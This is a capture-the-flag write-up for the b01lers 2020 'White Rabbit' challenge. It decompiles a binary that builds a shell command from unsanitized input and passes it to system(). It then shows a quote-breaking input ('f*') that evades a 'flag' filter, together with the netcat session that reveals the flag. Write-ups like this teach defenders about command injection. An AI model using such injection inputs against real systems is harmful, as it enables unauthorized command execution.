# b01lers bootcamp CTF 2020

## White Rabbit

> 100
>
> Follow the white rabbit...
>
> `nc chal.ctf.b01lers.com 1013`
>
> [whiterabbit](whiterabbit)

Tags: _x86-64_ _unsanitized-input_ _linux_ _bash_


## Summary

Fool a simple check with an unsanitized string.
 

## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Nice!  All mitigations in place.


### Decompile with Ghidra

```c
undefined8 FUN_00101249(void)
{
  char *pcVar1;
  long in_FS_OFFSET;
  char local_158 [64];
  char local_118 [264];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  puts("Follow the white rabbit.");
  printf("Path to follow: ");
  __isoc99_scanf(&DAT_00102032,local_158);
  pcVar1 = strstr(local_158,"flag");
  if (pcVar1 != (char *)0x0) {
    puts("No printing the flag.");
    exit(0);
  }
  sprintf(local_118,"[ -f \'%1$s\' ] && cat \'%1$s\' || echo File does not exist",local_158);
  system(local_118);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return 0;
}
```

`system` just executes `[ -f 'yourinput' ] && cat 'yourinput' || echo File does not exist`.

`yourinput` cannot have `flag` in it, and the single quotes prevent shell expansion, e.g. trying to use `f*`.

Since nothing is sanitizing the input we can just close the single quote to score an expansion and get the flag.  `'f*'` will do the trick, now `system` will execute:

```bash
[ -f ''f*'' ] && cat ''f*'' || echo File does not exist
```


## Exploit

```bash
# nc chal.ctf.b01lers.com 1013
Follow the white rabbit.
Path to follow: 'f*'
flag{Th3_BuNNy_wabbit_l3d_y0u_h3r3_4_a_reason}
```
